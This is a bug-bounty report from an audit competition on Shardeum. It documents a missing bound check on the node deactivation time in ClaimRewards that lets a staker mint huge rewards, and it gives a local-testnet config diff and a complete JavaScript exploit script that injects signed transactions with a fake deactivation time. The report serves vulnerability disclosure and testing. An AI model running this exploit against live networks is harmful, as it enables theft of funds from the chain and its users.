# #39875 \[BC-Critical] Lack of validation of node deactivation time in \`ClaimRewards\` allows to steal rewards

**Submitted on Feb 9th 2025 at 16:44:04 UTC by @Blockian for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39875
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardeum/tree/bugbounty>
* **Impacts:**
  * Direct loss of funds

## Description

## Impact

User can falsely get very large rewards by reporting a false `nodeDeactivatedTime` in `ClaimRewards`.

## Root Cause

The validation of `ClaimRewards` transaction lacks validation that `nodeDeactivationTime` is within bounds of the staking / active period of the node.

## Attack Flow

* A node stakes and becomes active in the network
* The node calls `InitRewardTime` with its actual activation time
* The node finishes being active
* The node calls c with a large fake deactivation time
* The reward is calculated according to the fake `nodeDeactivationTime`
* The node calls `InitRewardTime` and `ClaimRewards` again with actual values
* The node calls `Ustake` and receives all the reward

## Suggested Fix

* Validate `nodeDeactivatedTime`

## Severity

This allows to mint extremely large amounts of the native token, and so is critical.

## Proof of Concept

## Proof of Concept

In the POC you can see a user staking and claiming rewards with a very large `nodeDeactivatedTime` and receiving rewards for the entire (fake) period.

1. Apply the following changes on `Shardeum`

```diff
diff --git a/src/config/genesis.json b/src/config/genesis.json
index 53aeee7e..65e5cc1b 100644
--- a/src/config/genesis.json
+++ b/src/config/genesis.json
@@ -89,6 +89,9 @@
   "0x0c799D15c3f2e9dAf10677aD09565E93CAc3e4c4": {
     "wei": "1001000000000000000000"
   },
+  "0xE0291324263D7EC15fa3494bFDc1e902d8bd5d3d": {
+    "wei": "10000000000000000000000000"
+  },
   "0xEbe173a837Bc30BFEF6E13C9988a4771a4D83275": {
     "wei": "1001000000000000000000"
   },
diff --git a/src/config/index.ts b/src/config/index.ts
index 78a7c2c2..04d4e021 100644
--- a/src/config/index.ts
+++ b/src/config/index.ts
@@ -143,9 +143,9 @@ config = merge(config, {
     p2p: {
       cycleDuration: 60,
       minNodesToAllowTxs: 1, // to allow single node networks
-      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 1280, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
-      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 1280,
-      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 1280,
+      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 10, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
+      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 10,
+      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 10,
       maxJoinedPerCycle: 10,
       maxSyncingPerCycle: 10,
       maxRotatedPerCycle: process.env.maxRotatedPerCycle ? parseInt(process.env.maxRotatedPerCycle) : 1,
@@ -157,7 +157,7 @@ config = merge(config, {
       amountToShrink: 5,
       maxDesiredMultiplier: 1.2,
       maxScaleReqs: 250, // todo: this will become a variable config but this should work for a 500 node demo
-      forceBogonFilteringOn: true,
+      forceBogonFilteringOn: false,
       //these are new feature in 1.3.0, we can make them default:true in shardus-core later
 
       // 1.2.3 migration starts
@@ -218,13 +218,13 @@ config = merge(config, {
       allowActivePerCycle: 1,
 
       syncFloorEnabled: true,  //ITN initially false for rotation safety
-      syncingDesiredMinCount: 40, //ITN = 40
+      syncingDesiredMinCount: 5, //ITN = 40
 
       activeRecoveryEnabled: true,//ITN initially false for rotation safety
       allowActivePerCycleRecover: 4, 
 
       flexibleRotationEnabled: true, //ITN 1.16.1
-      flexibleRotationDelta: 10,
+      flexibleRotationDelta: 0,
 
       maxStandbyCount: 30000, //max allowed standby nodes count
       enableMaxStandbyCount: true,
@@ -295,7 +295,7 @@ config = merge(config, {
     sharding: {
       nodesPerConsensusGroup: process.env.nodesPerConsensusGroup
         ? parseInt(process.env.nodesPerConsensusGroup)
-        : 128, //128 is the final goal
+        : 10, //128 is the final goal
       nodesPerEdge: process.env.nodesPerEdge ? parseInt(process.env.nodesPerEdge) : 5,
       executeInOneShard: true,
     },
@@ -345,11 +345,11 @@ config = merge(
   config,
   {
     server: {
-      mode: 'release', // todo: must set this to "release" for public networks or get security on endpoints. use "debug"
+      mode: 'debug', // todo: must set this to "release" for public networks or get security on endpoints. use "debug"
       // for easier debugging
       debug: {
-        startInFatalsLogMode: true, // true setting good for big aws test with nodes joining under stress.
-        startInErrorLogMode: false,
+        startInFatalsLogMode: false, // true setting good for big aws test with nodes joining under stress.
+        startInErrorLogMode: true,
         verboseNestedCounters: false,
         robustQueryDebug: false,
         fakeNetworkDelay: 0,
@@ -419,6 +419,8 @@ config = merge(
           /* prettier-ignore */ '0x7Fb9b1C5E20bd250870F87659E46bED410221f17': DevSecurityLevel.High,
           /* prettier-ignore */ '0x1e5e12568b7103E8B22cd680A6fa6256DD66ED76': DevSecurityLevel.High,
           /* prettier-ignore */ '0xa58169308e7153B5Ce4ca5cA515cC4d0cBE7770B': DevSecurityLevel.High,
           // always prefix with prettier ignore
         },
         checkAddressFormat: true, //enabled for 1.10.0
diff --git a/src/index.ts b/src/index.ts
index 22fb7ae9..1652c412 100644
--- a/src/index.ts
+++ b/src/index.ts
@@ -2378,7 +2378,7 @@ const configShardusEndpoints = (): void => {
   })
 
   // endpoint on joining nodes side to receive admin certificate
-  shardus.registerExternalPut('admin-certificate', externalApiMiddleware, async (req, res) => {
+  shardus.registerExternalPut('admin-certificate', externalApiMiddleware, async (req: Request, res) => {
     try {
       nestedCountersInstance.countEvent('shardeum-admin-certificate', 'called PUT admin-certificate')

```

2. Run a `json-rpc-server`
3. Run the following attack script:

```js
import axios from "axios";
import crypto from '@shardus/crypto-utils';
import { ethers } from 'ethers'
import { fromAscii } from "@ethereumjs/util";

crypto.init("69fa4195670576c0160d660c3be36556ff8d504725be8a59b5a96509e0c994bc")

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

let keyPair = {
    address: "0xE0291324263D7EC15fa3494bFDc1e902d8bd5d3d",
    publicKey: '0x7255db7f8aa57518fd0bceb743eb85fa110c791cc78661818677255006269855',
    secretKey: '0x759418c4f40e463452b15eda4b27478d152f2a2c04e6cd324fb620a9eede60217255db7f8aa57518fd0bceb743eb85fa110c791cc78661818677255006269855',
    privateKey: '0x759418c4f40e463452b15eda4b27478d152f2a2c04e6cd324fb620a9eede6021'
}

const JSON_RPC_URL = "http://127.0.0.1:8080";
const stake_to_address = "0x0000000000000000000000000000000000010000";
const provider = new ethers.providers.JsonRpcProvider(JSON_RPC_URL);
const wallet = new ethers.Wallet(keyPair.privateKey, provider);

async function sendStakeTransaction() {
    const stake_data = {
        stake: 10000000000000000000,
        internalTXType: 6, // Stake
        nominee: keyPair.publicKey.replace('0x', '').padEnd(64, '0'),
        nominator: keyPair.address,
    };
    const stake_tx = {
        to: stake_to_address,
        value: BigInt(10000000000000000000),
        data: fromAscii(JSON.stringify(stake_data))
    };
    const tx = await wallet.sendTransaction(stake_tx);
    const receipt = await tx.wait();

    return receipt;
}

async function sendUnstakeTransaction() {
    const stake_data = {
        internalTXType: 7, // Unstake
        nominee: keyPair.publicKey.replace('0x', '').padEnd(64, '0'),
        nominator: keyPair.address,
    };
    const stake_tx = {
        to: stake_to_address,
        value: 0,
        data: fromAscii(JSON.stringify(stake_data))
    };
    const tx = await wallet.sendTransaction(stake_tx);
    const receipt = await tx.wait();

    return receipt;
}
  
async function sendFirstInitRewardTimes(randomNode) {
    let initRewardTimesTx = {
        isInternalTx: true,
        internalTXType: 8, // InternalTXType.InitRewardTimes
        nominee: keyPair.publicKey.replace('0x', '').padEnd(64, '0'),
        nodeActivatedTime: Math.floor(Date.now() / 1000) - 6000,
        timestamp: Date.now()
    }
    crypto.signObj(initRewardTimesTx, keyPair.secretKey.replace('0x', ''), keyPair.publicKey.replace('0x', ''))
    console.log("Signing InternalTx: ", initRewardTimesTx)
    
    let res = await axios.post(`http://${randomNode.ip}:${randomNode.port}/inject`, initRewardTimesTx)
    if(!res.data.success) throw new Error(res.data.reason)
}

async function sendFirstClaimRewards(randomNode) {
    let claimRewardTx = {
        isInternalTx: true,
        internalTXType: 9, // InternalTXType.ClaimRewards
        nominee: keyPair.publicKey.replace('0x', '').padEnd(64, '0'),
        nominator: keyPair.address,
        deactivatedNodeId: 'blockian'.padEnd(64, '0'),
        nodeDeactivatedTime: 9999999999999999999999,
        timestamp: Date.now()
    }
    crypto.signObj(claimRewardTx, keyPair.secretKey.replace('0x', ''), keyPair.publicKey.replace('0x', ''))
    console.log("Signing InternalTx: ", claimRewardTx)
    
    let res = await axios.post(`http://${randomNode.ip}:${randomNode.port}/inject`, claimRewardTx)
    if(!res.data.success) throw new Error(res.data.reason)
}

async function sendSecondInitRewardTimes(randomNode) {
    let initRewardTimesTx = {
        isInternalTx: true,
        internalTXType: 8, // InternalTXType.InitRewardTimes
        nominee: keyPair.publicKey.replace('0x', '').padEnd(64, '0'),
        nodeActivatedTime: Math.floor(Date.now() / 1000) - 6000,
        timestamp: Date.now()
    }
    crypto.signObj(initRewardTimesTx, keyPair.secretKey.replace('0x', ''), keyPair.publicKey.replace('0x', ''))
    console.log("Signing InternalTx: ", initRewardTimesTx)
    
    let res = await axios.post(`http://${randomNode.ip}:${randomNode.port}/inject`, initRewardTimesTx)
    if(!res.data.success) throw new Error(res.data.reason)
}

async function sendSecondClaimRewards(randomNode) {
    let claimRewardTx = {
        isInternalTx: true,
        internalTXType: 9, // InternalTXType.ClaimRewards
        nominee: keyPair.publicKey.replace('0x', '').padEnd(64, '0'),
        nominator: keyPair.address,
        deactivatedNodeId: 'blockian'.padEnd(64, '0'),
        nodeDeactivatedTime: Math.floor(Date.now() / 1000) - 60,
        timestamp: Date.now()
    }
    crypto.signObj(claimRewardTx, keyPair.secretKey.replace('0x', ''), keyPair.publicKey.replace('0x', ''))
    console.log("Signing InternalTx: ", claimRewardTx)
    
    let res = await axios.post(`http://${randomNode.ip}:${randomNode.port}/inject`, claimRewardTx)
    if(!res.data.success) throw new Error(res.data.reason)
}

async function printState(randomNode) {
    let data1 = await axios.get(`http://${randomNode.ip}:${randomNode.port}/account/${keyPair.publicKey.replace('0x', '').padEnd(64, '0')}`)
    let data2 = await axios.get(`http://${randomNode.ip}:${randomNode.port}/account/${keyPair.address.replace('0x', '').padEnd(64, '0')}`)
    console.log(data1.data);
    console.log(data2.data);
}

async function waitTillFinish() {
    console.log("Waiting 60 sec for transaction to be finalized");
    await sleep(60000)
}

const main = async  () => {
    console.log("Grabbing Nodelist ....");
    let res = await axios.get('http://0.0.0.0:4000/nodelist')
    const nodelist = res.data.nodeList
    const randomNode = nodelist[Math.floor(Math.random() * nodelist.length)]
    

    console.log("Data before stake --------------------------------------")
    await printState(randomNode)
    await sendStakeTransaction()
    await waitTillFinish()
    
    console.log("Data after stake, before 1st initRewardTimes --------------------------------------")
    await printState(randomNode)

    await sendFirstInitRewardTimes(randomNode);
    await waitTillFinish()

    console.log("Data after 1st initRewardTimes, before 1st claimRewards --------------------------------------")
    await printState(randomNode)

    await sendFirstClaimRewards(randomNode);
    await waitTillFinish()

    console.log("Data after 1st claimRewards, before 2nd initRewardTimes --------------------------------------")
    await printState(randomNode)

    await sendSecondInitRewardTimes(randomNode)
    await waitTillFinish()

    console.log("Data after 2st initRewardTimes, before 2nd claimRewards --------------------------------------")
    await printState(randomNode)

    await sendSecondClaimRewards(randomNode);
    await waitTillFinish()

    console.log("Data after 2nd claimRewards, before unstake --------------------------------------")
    await printState(randomNode)

    await sendUnstakeTransaction();
    await waitTillFinish()

    console.log("Data after unstake --------------------------------------")
    await printState(randomNode)
}

main();
```
